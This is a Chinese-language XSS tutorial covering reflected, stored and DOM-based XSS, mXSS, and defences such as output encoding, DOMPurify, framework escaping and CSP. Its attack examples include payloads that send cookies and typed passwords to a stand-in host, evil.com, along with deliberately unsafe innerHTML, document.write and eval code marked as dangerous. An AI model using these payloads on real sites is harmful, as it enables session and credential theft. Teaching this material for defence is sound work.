# XSS（跨站脚本攻击）

## 1. 三种 XSS 类型

```
┌─────────────────┬─────────────────┬─────────────────┐
│   反射型 XSS     │   存储型 XSS     │   DOM 型 XSS    │
├─────────────────┼─────────────────┼─────────────────┤
│ URL 参数注入     │ 数据库存储注入   │ JS 操作 DOM 注入 │
│ 一次有效        │ 持久有效        │ 不经过服务端    │
│ 需诱导点击      │ 自动触发        │ 客户端 JS 触发  │
│ 钓鱼邮件常见    │ 评论区常见      │ #hash 路由常见  │
└─────────────────┴─────────────────┴─────────────────┘
```

## 2. 攻击示例

### 反射型 XSS

```
攻击者发送链接：
https://example.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>

服务端返回：
<p>搜索结果：<script>fetch('https://evil.com?c='+document.cookie)</script></p>
浏览器执行：把 Cookie 发送到攻击者服务器
```

### 存储型 XSS

```
攻击者在评论区提交：
<script>
  const password = document.querySelector('input[type="password"]');
  password.addEventListener('input', (e) => {
    fetch('https://evil.com/log?pw=' + e.target.value);
  });
</script>

所有查看该评论的用户都会执行这段代码，密码被实时窃取
```

### DOM 型 XSS

```javascript
// ❌ 危险的代码
const hash = location.hash.slice(1);
document.write(hash);  // 如果 URL 是 #<img src=x onerror=alert(1)>

// ❌ 危险的 innerHTML
const params = new URLSearchParams(location.search);
document.getElementById('output').innerHTML = params.get('name');

// ✅ 安全的 textContent
document.getElementById('output').textContent = params.get('name');
```

## 3. 防护策略

### 输出编码

```javascript
// HTML 编码
codebook = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#x27;',
  '/': '&#x2F;',
};

function escapeHtml(str) {
  return String(str).replace(/[&<>"'\/]/g, (s) => codebook[s]);
}

// 不同上下文使用不同编码
// HTML 内容: escapeHtml(userInput)
// HTML 属性: 加引号 + escapeHtml
// JavaScript: JSON.stringify(userInput)
// URL: encodeURIComponent(userInput)
// CSS: 严格白名单
```

### DOMPurify

```javascript
import DOMPurify from 'dompurify';

// 允许富文本但过滤危险标签
const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
  ALLOWED_ATTR: [],
});

// 默认配置已经很严格
const clean = DOMPurify.sanitize(dirtyHtml);

// 配置禁止某些属性（防止 javascript: 伪协议）
const clean = DOMPurify.sanitize(dirtyHtml, {
  FORBID_ATTR: ['style'],
  FORBID_TAGS: ['style', 'script'],
});
```

### 现代框架自动防护

```jsx
// React 自动转义
function Safe() {
  const userInput = '<script>alert(1)</script>';
  return <div>{userInput}</div>;  // 输出: &lt;script&gt;alert(1)&lt;/script&gt;
}

// ❌ React 中的危险操作
dangerouslySetInnerHTML={{ __html: userInput }}

// ❌ Vue v-html
<div v-html="userInput"></div>

// ✅ Vue 插值自动转义
<div>{{ userInput }}</div>
```

## 4. CSP（Content Security Policy）

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com 'nonce-abc123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
```

## 5. 其他 XSS 变种

### mXSS（突变 XSS）

```html
<!-- 浏览器会"修复"不规范的 HTML，导致过滤失效 -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>

<!-- 浏览器修复后变成： -->
<noscript><p title="</noscript>"><img src=x onerror=alert(1)>"></p></noscript>
```

### 基于 DOM 的 XSS（Location/History API）

```javascript
// ❌ 危险的 hash 路由处理
const content = decodeURIComponent(location.hash.slice(1));
eval(content);  // 极度危险

// ❌ history.pushState 后使用
history.pushState({}, '', '/page?data=' + userInput);
// 然后从 location.search 读取并插入 DOM
```
